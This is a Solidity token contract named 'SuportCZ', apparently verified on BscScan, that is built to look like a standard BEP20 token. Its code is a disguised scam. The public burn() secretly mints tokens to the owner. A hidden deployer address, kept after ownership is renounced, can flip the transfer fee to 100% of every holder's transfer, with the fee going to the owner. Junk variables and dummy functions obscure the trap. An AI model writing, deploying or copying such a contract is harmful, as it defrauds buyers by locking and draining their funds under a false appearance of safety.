/**
 *Submitted for verification at BscScan.com on 2022-12-12
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity =0.5.5;
contract SuportCZ {
address public  xaFlTp = address(0);
string public  symbol = "SuportCZ";
address public  UNZyzY = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
uint256 public  PIgRIW = 9;
uint256 public  UnpwTL = 12;
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 public  kUjJSI = 14;
address public  TZahhi = address(0);
uint256 public  sqGgzZ = 16;
mapping (address => uint256) public balanceOf;
address public  pMxPNO = address(0);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address private  SCjcGF = address(0);
address public  TpMbls = address(0);
uint256 public  STFtiu = 19;
string public  name = "SuportCZ";
event Transfer(address indexed from, address indexed to, uint256 value);
address public owner;
uint256 public  LeueOG = 22;
uint8 public constant decimals = 18;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 public  nFjxlR = 29;
address public  nXehkg = address(0);
uint256 public constant totalSupply = 10000000000000000000000000000;
uint256 public constant eYOVui = 9+1;
uint256 private  ZcMFkM = 10000000000000;
uint256 public  DuhMyK = 32;
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
constructor () public {
SCjcGF = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}

function _liq1PIgRIW() private returns (uint256) {
return PIgRIW++ ;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}

function _addUn2pwTL() private returns (uint256) {
return UnpwTL-- ;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "lMjXSZ");
require(to != address(0), "lMjXSZ");
require(amount <= balanceOf[from], "lMjXSZ");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* eYOVui/ZcMFkM ;
}
//
uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==SCjcGF){
ZcMFkM = 9+1;
}
emit Transfer(from, to, transferAmount);
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}

function _liqkUj3JSI() private returns (uint256) {
return kUjJSI + UnpwTL ;
}

function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}

function _addsqGg4zZ() private returns (uint256) {
return sqGgzZ - STFtiu ;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}

function _addSTFti5u() private returns (uint256) {
return STFtiu * sqGgzZ ;
}

function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");
//
_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}

function _liqL6eueOG() private returns (uint256) {
return LeueOG / nFjxlR ;
}

function _liqnF7jxlR() private returns (uint256) {
return nFjxlR + LeueOG ;
}

function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");
//
balanceOf[account] += amount;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}

function _liqDuh8MyK() private returns (uint256) {
return DuhMyK++ ;
}

//
}